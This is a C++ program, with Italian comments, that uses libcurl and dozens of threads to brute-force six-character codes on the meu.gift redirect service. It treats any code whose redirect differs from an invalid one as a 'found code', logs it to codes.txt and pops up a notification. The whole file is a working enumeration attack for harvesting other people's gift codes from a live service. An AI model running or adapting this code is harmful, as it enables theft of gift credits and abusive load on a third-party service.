#include <stdio.h>
#include <curl/curl.h>
#include <iostream>
#include <string>
#include <pthread.h>
#include <unistd.h>
#include <fstream>

using namespace std;
 pthread_t tid[27];
 pthread_t tid_2[27];
 pthread_t sl;

char all_max[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
char all_min[] = "abcdefghijklmnopqrstuvwxyz";
char all_num[] = "0123456789";
int counter = 0;
int numcodes = 0;

const std::string magenta("\033[0;35m");
const std::string reset("\033[0m");
const std::string green("\033[1;32m");


char *getredirect(CURL *curl, CURLcode res, string link, string parola) {
//cout << "CODICE: " << parola <<  endl;
char *location;
long response_code;

if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
 
    
    res = curl_easy_perform(curl);
  
   
    
      res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
      if((res == CURLE_OK) &&
         ((response_code / 100) != 3)) {
      
        fprintf(stderr, "Not a redirect.\n");
        return "not";
      }
      else {
        res = curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &location);
 
        if((res == CURLE_OK) && location) {
         
          return location;
        }
      }
    
 
   
  }

} 


void *thread2_1(void *first_param) { //seconda A parte 1
  int first = int(first_param);
  
  ofstream myfile;
  CURL *curl;
  CURLcode res;
  curl = curl_easy_init();

  char parola[7];
  parola[6]='\0';

  string error = getredirect(curl, res, "https://meu.gift/XXXXXX", "XXXXXX");
  //cout << "Errore di riferimento: " << error << endl;
  cout << magenta << "Inizio thread numero: " << counter << endl;
  counter++;
  string get = error;

 
	parola[0]=all_max[first]; //PRIMA LETTERA STANDARD
	    parola[1]=all_max[1]; //fissa seconda lettera
		for (int z = 0; z <= 4; z++) {
			parola[2]=all_num[z];
			for (int h = 0; h <= 25; h++) {
                parola[3]=all_min[h];
				for (int y = 0; y <= 9; y++) {
                   parola[4] = all_num[y];
					for (int x = 0; x <= 25; x++) {
						parola[5] = all_min[x];
                        
                        string fullstr = "https://meu.gift/"+string(parola);
                        get = getredirect(curl, res, fullstr, string(parola));
                       if (get != "not") { 
                        if (get != error) {
                        
                              myfile.open ("codes.txt", fstream::app);
                              myfile << "CODICE TROVATO: " <<string(parola) << "\n";
                              cout << green << "CODICE TROVATO INSERITO IN CODES.TXT!!" << endl;
                              myfile.close(); 
                              string notify = "notify-send \"CODICE TROVATO\" \""+string(parola)+"\"";
                              system(notify.c_str());
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                                     } 
                          numcodes++;
                         }
                    }
                }
             }
         }
    
  
}

void *thread2_2(void *first_param) { //seconda A parte 2
  int first = int(first_param);
  ofstream myfile;
  CURL *curl;
  CURLcode res;
  curl = curl_easy_init();

  char parola[7];
  parola[6]='\0';

  string error = getredirect(curl, res, "https://meu.gift/XXXXXX", "XXXXXX");
  //cout << "Errore di riferimento: " << error << endl;
  cout << magenta << "Inizio thread numero: " << counter << endl;
  counter++;
  string get = error;


	parola[0]=all_max[first]; //PRIMA LETTERA STANDARD
	    parola[1]=all_max[1]; //fissa seconda lettera
		for (int z = 5; z <= 9; z++) {
			parola[2]=all_num[z];
			for (int h = 0; h <= 25; h++) {
                parola[3]=all_min[h];
				for (int y = 0; y <= 9; y++) {
                   parola[4] = all_num[y];
					for (int x = 0; x <= 25; x++) {
						parola[5] = all_min[x];
                        
                        string fullstr = "https://meu.gift/"+string(parola);
                        get = getredirect(curl, res, fullstr, string(parola));
                       
                       if (get != "not") { 
                        if (get != error) {
                         
                              myfile.open ("codes.txt", fstream::app);
                              myfile << "CODICE TROVATO: " <<string(parola) << "\n";
                              cout << green << "CODICE TROVATO INSERITO IN CODES.TXT!!" << endl;
                              myfile.close(); 
                              string notify = "notify-send \"CODICE TROVATO\" \""+string(parola)+"\"";
                              system(notify.c_str());
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                              cout << green << "CODICE TROVATOOOOOOOOOOOOOOOOOOOOOo!!!!!!!!!!!!: " << string(parola) << endl;
                                     } 
                          numcodes++;
                        }
                    }
                }
             }
         }
    
  
  
}


void check() {
while (true) {
sleep(30);
cout << reset << "Numero codici provati: " << numcodes << endl;

}

}


int main(void)
{
   for (int first = 0; first <= 25; first++) {
  //cout << "Avvio thread PRIMA LETTERA numero " << first << "..." << endl; //THREAD PER FISSARE LA PRIMA LETTERA
  pthread_create(&tid[first], NULL, thread2_1, (void*)first);
}
for (int first = 0; first <= 25; first++) {
  //cout << "Avvio thread PRIMA LETTERA numero " << first << "..." << endl; //THREAD PER FISSARE LA PRIMA LETTERA
  pthread_create(&tid_2[first], NULL, thread2_2, (void*)first);
}
  pthread_create(&sl, NULL, check, NULL);
  while(true);
  return 0;
}
